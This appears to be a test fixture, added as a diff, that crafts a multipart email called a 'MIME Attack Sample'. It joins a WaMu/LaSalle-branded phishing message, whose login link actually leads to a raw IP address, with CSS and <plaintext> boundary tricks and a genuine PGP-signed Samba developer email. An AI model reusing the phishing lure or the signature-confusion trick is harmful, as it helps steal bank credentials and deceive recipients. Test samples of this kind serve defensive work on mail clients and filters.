@@ -1,0 +1,174 @@
+From: coldwatercreek.1621644.3764.0@thecreek.coldwatercreek.com
+To: david.peterson@ndequality.com, jim.schwieger@enron.com, jzysk@compuserve.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/mixed; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<style type=3D"text/css">
+<!--
+style1 {
+	color: #FF0000;
+	font-weight: bold;
+}
+style2 {
+	font-family: Tahoma;
+	font-size: 12px;
+}
+style4 {font-size: 10}
+style7 {font-size: 12px}
+-->
+</style>
+<span class=3D"style2"><img src=3Dhttp://www.wamu.com/images/wamucom_logo_=
+blue.gif><br>
+
+</span>
+<table>
+<tr>
+<td class=3D"style2">Dear Customer,                                       =
+      </td>
+</tr>
+</table>
+
+<span class=3D"style2"><br>
+
+</span><BR>
+<p align=3Dleft class=3D"style2">
+We recently have determined that different computers have logged onto
+your Online Banking account, and multiple password failures were
+present before the logons. We now need you to re-confirm your account
+information to us. If this is not completed by <b>July 02 2005</b>,
+we will be forced to suspend your account indefinitely, as it may have
+been used for fraudulent purposes. We thank you for your cooperation in
+this manner.<br>
+<br>
+To confirm your Online Banking records click here:<br>
+<br>
+<a target=3D"_blank" href=3D"http://67.162.223.217/pictures/LaSalle/Lasall=
+e/index.php">
+https://login.personal.wamu.com/logon/logon.asp?dd=3D1</a><br>
+<br>
+We apologize for any inconvenience this may cause, and appreciate your 
+assistance in helping us maintain the integrity of<br>the entire LaSalle B=
+ank 
+system. Thank you for attention to this matter.<br>
+
+<br>
+<br>
+<br>
+Sincerely,<br>
+<br>
+The LaSalle Bank Team<br>
+<br>
+Please do not reply to this e-mail. Mail sent to this address cannot be 
+answered. For assistance, log in to your<br>LaSalle Bank account and choos=
+e 
+the "Help" link in the header of any page.
+
+
+
+
+
+</p>
+<table width=3D"50%" cellspacing=3D"0" cellpadding=3D"0" border=3D"0">
+	<tr>
+    	<td class=3D"style2"><div align=3D"center"><br>
+      </div></td>
+	</tr>
+	<tr>
+    	<td align=3D"center" class=3D"style2">
+			<table width=3D"550" cellspacing=3D"0" cellpadding=3D"0" border=3D"0">
+				<tr>
+    				<td><div align=3D"left" class=3D"footerText">
+    				  <div align=3D"center"><nobr><span class=3D"style2			            =
+SunTrust Banks, Inc. All 
+                      rights reserved.<br> 
+                      Equal Housing Lender - Member FDIC</span></nobr></di=
+v>
+    				</div></td>
+				</tr>
+				<tr>
+    				<td><div align=3D"center" class=3D"footerText"><br>
+                        <span class=3D"style7"> <a class=3D"linkFooter" hr=
+ef=3D"http://www.wamu.com/common/Frameset/Investor_Relations/frameset.asp?=
+source=3Dhttp://www.shareholder.com/suntrust/" target=3D"_self">Investor 
+                    Relations</a>  | <a class=3D"linkFooter" href=3D"https=
+://www2.wamu.com/privacy.html" target=3D"_self">Privacy</a>  | <a class=3D=
+"linkFooter" href=3D"https://www2.wamu.com/security.html" target=3D"_self"=
+>Security</a>  | <a class=3D"linkFooter" href=3D"https://www2.wamu.com/abo=
+utsite.html" target=3D"_self">About 
+                    Our Site</a> | <a class=3D"linkFooter" href=3D"http://=
+www.wamu.com/common/SiteMap/index.asp" target=3D"_self">Site Map</a>  | <a=
+ class=3D"linkFooter" href=3D"http://www.wamu.com/alert/index.asp" target=3D=
+"_self">About Email Fraud</a>
+                        </span></div></td>
+				</tr>
+			</table>
+		</td>
+	</tr>
+</table>
+
+
+----65581157978474262806--
+<style>fieldset, br{display: none;}</style>
+<div style="display: none;"><plaintext>
+--DELIMITER
+Content-Type: multipart/signed; boundary="BOUNDARY"; protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+Hey guys,
+
+I've pushed out all my pending patches for winbindd except:
+
+(a) security = ads & machine password change in winbindd
+(b) username map support for winbindd
+
+Since these might possibly require some discussion and general
+agreement, I'll post patches to the list here.
+
+The major merges are
+
+1.  Maintaining the full trust topology (including transitive
+    trusts).  These should be accessed by child processes
+    using the wcache_tdc_xxx() functions.
+
+2.  Support for one-way trusts
+
+3.  Working offline logons with remote idmap backends
+
+4.  Updated set_dc_and_flags() functionality based on trust
+    information from our primary domain.  This means we
+    should be able to avoid contacting remote domains
+    (inside our forest).
+
+There's other minor fixes.  I tried to break the commits
+up into manage chunks (about 30 I think).
+
+All of this is working in my local tree but I'll spend a good
+bit of time testing tomorrow and make sure I haven't introduced
+any regressions.  Might take a day or so to stabilize.
+
+
+
+
+
+cheers, jerry
+-BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.3 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGPlieIR7qMdg1EfYRAo0eAKCmjNX17wgQPAxBjvHLjSqmUwXnZACfeYlF
+lIt/uKM04MdZegAy+sdgqik=
+=Vv50
+-----END PGP SIGNATURE-----
+
+
+--BOUNDARY--
+--DELIMITER--
